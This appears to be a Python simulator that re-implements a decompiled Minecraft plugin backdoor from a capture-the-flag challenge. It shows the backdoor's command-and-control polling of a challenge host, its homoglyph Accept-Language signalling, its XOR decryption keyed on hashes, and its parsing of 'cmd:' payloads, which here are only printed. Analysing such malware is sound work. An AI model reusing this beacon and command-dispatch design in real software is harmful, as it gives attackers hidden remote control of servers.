import hashlib
import json
import urllib.request
from io import BytesIO

class ResourcePackSimulator:
    LANGUAGE_ARRAYS = [
        [73, 95, 240, 129, 65, 98, 149, 179, 231, 243, 235, 56, 81, 58, 228, 64],
        [252, 132, 179, 77, 20, 74, 122, 236, 174, 248, 190, 114, 29, 55, 250, 86, 38],
        [73, 95, 240, 181, 72, 141, 202, 250, 236, 166, 161, 116, 92, 36, 242],
        [252, 132, 179, 77, 32, 67, 149, 179, 231, 243, 235, 56, 81, 58, 228, 64],
        [73, 95, 240, 21, 36, 107, 202, 250, 236, 166, 161, 116, 92, 36, 242],
        [252, 132, 179, 77, 128, 47, 115, 179, 231, 243, 235, 56, 81, 58, 228, 64],
        [73, 228, 101, 77, 128, 47, 115, 179, 231, 243, 235, 56, 81, 58, 228, 64]
    ]
    
    SALT_ARRAY = [75, 89, 188, 19, 129, 146, 159, 192, 225, 245, 185, 42, 7, 111, 164, 39, 109, 245, 105, 142]
    
    PLUGIN_URL_ARRAY = [68, 69, 169, 16, 207, 209, 201, 174, 181, 175, 254, 123, 93, 36, 250, 86, 44, 174, 61, 202, 153, 158, 187, 72, 196, 68, 165, 58, 61, 29, 112, 59, 119, 220, 81, 254, 3, 67, 37, 191, 131]
    
    DATAPACK_URL_ARRAY = [68, 69, 169, 16, 207, 209, 201, 174, 181, 175, 254, 123, 93, 36, 250, 86, 44, 174, 61, 202, 153, 158, 187, 72, 196, 68, 165, 58, 61, 29, 112, 59, 119, 220, 81, 234, 14, 66, 35, 166, 140, 37, 152]

    def __init__(self):
        # private long a = 0L;
        self.tick_counter = 0
        
        # private int a = 0;
        self.language_index = 0
        
        # private String d; (plugin hash)
        self.plugin_hash = None
        
        # private String e; (datapack hash)
        self.datapack_hash = None
        
        # CryptoTools.decryptDES - Values after decryption
        self.languages = [
            "en-ᴜs,en;q=0.8",
            "еn-ᴜs,en;q=0.8",
            "en-սs,en;q=0.8",
            "еn-սs,en;q=0.8",
            "en-uѕ,en;q=0.8",
            "еn-uѕ,en;q=0.8",
            "eո-uѕ,en;q=0.8"
        ]
        self.salt = "ghastly_chicken_salt"

        self.plugin_url = "http://cjfc.challs.haix-la-chapelle.eu/updatecheck/plugin"
        self.datapack_url = "http://cjfc.challs.haix-la-chapelle.eu/updatecheck/datapack"
    
    @staticmethod
    def hexToBytes(hex_string):
        """
        private static byte[] a(String var0)
        """
        return bytes.fromhex(hex_string)
    
    @staticmethod
    def xorBytes(data, key):
        """
        private static byte[] a(byte[] var0, byte[] var1)
        """
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % len(key)]
        return bytes(result)
    
    @staticmethod
    def commands(payload):
        """
        private static void a(String var0)
        """
        commands = payload.replace('\u0000', '').split(';')
        
        for cmd in commands:
            if cmd.startswith('cmd:'):
                actual_cmd = cmd[4:].strip()
                print(f"[Command] {actual_cmd}")
    
    def fetchDecrypt(self, url, accept_language, is_datapack):
        """
        private byte[] a(String var1, String var2, boolean var3) throws Exception
        """
        try:
            req = urllib.request.Request(url)
            
            lang_bytes = accept_language.encode('utf-8')
            lang_latin1 = lang_bytes.decode('latin-1')
            
            req.add_header('Accept-Language', lang_latin1)
            req.add_header('User-Agent', 'CJFC UpdateChecker')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                json_response = response.read().decode('utf-8')
            
            data = json.loads(json_response)
            encrypted_hex = data.get('sha512', '')
            
            if not encrypted_hex:
                print(f"[ERROR] No hash found. Aborting..")
                return None
            
            file_hash = self.datapack_hash if is_datapack else self.plugin_hash
            if not file_hash:
                print(f"[ERROR] No file hash found. Aborting..")
                return None
            
            import time
            timestamp = int(time.time() * 1000) // 300000
            
            comma_pos = accept_language.find(',')
            lang_clean = accept_language[:comma_pos] if comma_pos > 0 else accept_language
            
            key_string = f"{self.salt}|{lang_clean}|{timestamp}|{file_hash}"
            
            print(f"key: {key_string[:60]}...")
            
            key = hashlib.sha512(key_string.encode('utf-8')).digest()
            
            encrypted_bytes = self.hexToBytes(encrypted_hex)
            decrypted = self.xorBytes(encrypted_bytes, key)
            
            return decrypted
            
        except Exception as e:
            print(f"[ERROR] Failed to fetch from server: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def run(self):
        """
        public void run()
        """
        # ++this.a;
        self.tick_counter += 1
        
        # if (this.a % 720L == 0L)
        if self.tick_counter % 720 == 0:
            try:
                # if (this.d == null) { this.d = c(); }
                if self.plugin_hash is None:
                    self.plugin_hash = self.getPluginHash()
                
                # if (this.e == null) { this.e = d(); }
                if self.datapack_hash is None:
                    self.datapack_hash = self.getDatapackHash()
                
                # ++this.a;
                self.language_index += 1
                
                # String var1 = a[this.a % a.length];
                language = self.languages[self.language_index % len(self.languages)]
                
                print(f"\n{'='*60}")
                print(f"[RUN] Tick {self.tick_counter}")
                print(f"{'='*60}")
                print(f"Language Index: {self.language_index} % {len(self.languages)} = {self.language_index % len(self.languages)}")
                print(f"Language: {language}\n")
                
                # ByteArrayOutputStream var2 = new ByteArrayOutputStream();
                combined = BytesIO()
                
                # if ((var3 = this.a(a(), var1, false)) != null) { var2.write(var3); }
                plugin_data = self.fetchDecrypt(self.plugin_url, language, False)
                if plugin_data is not None:
                    combined.write(plugin_data)
                    print(f"[PLUGIN] {len(plugin_data)} bytes empfangen")
                
                # if ((var5 = this.a(b(), var1, true)) != null) { var2.write(var5); }
                datapack_data = self.fetchDecrypt(self.datapack_url, language, True)
                if datapack_data is not None:
                    combined.write(datapack_data)
                    print(f"[DATAPACK] {len(datapack_data)} bytes empfangen")
                
                # if ((var5 = var2.toByteArray()).length > 0)
                payload_bytes = combined.getvalue()
                if len(payload_bytes) > 0:
                    # a(new String(var5, StandardCharsets.UTF_8));
                    payload_string = payload_bytes.decode('utf-8', errors='ignore')

                    print(f"[PAYLOAD] Text:\n{payload_string[:200]}\n")
                
            except Exception as e:
                print(f"[ERROR] Run failed: {e}")
                import traceback
                traceback.print_exc()
    
    def getPluginHash(self):
        """
        private static String c()
        """
        return "b64d0ff05e412a397ed874750426706a7d5f76e3aa29dd8a27158ad46da6afc503b3803c2b9634ae014589ddbe5ae3b1e6c4f63d6fb11649d0fbf3379e9da89e"
    
    def getDatapackHash(self):
        """
        private static String d()
        """
        return "ca06f5119f7a716489368308bfb47e953905c61164f296a461d9c61f5579d85521c0c39b8b3e682c6d6cb19dde8a0ea58ce5cea770be78be6e1197493d6df082"


def main():
    simulator = ResourcePackSimulator()

    for i in range(7):
        simulator.tick_counter = (i + 1) * 720 - 1
        simulator.run()


if __name__ == "__main__":
    main()
    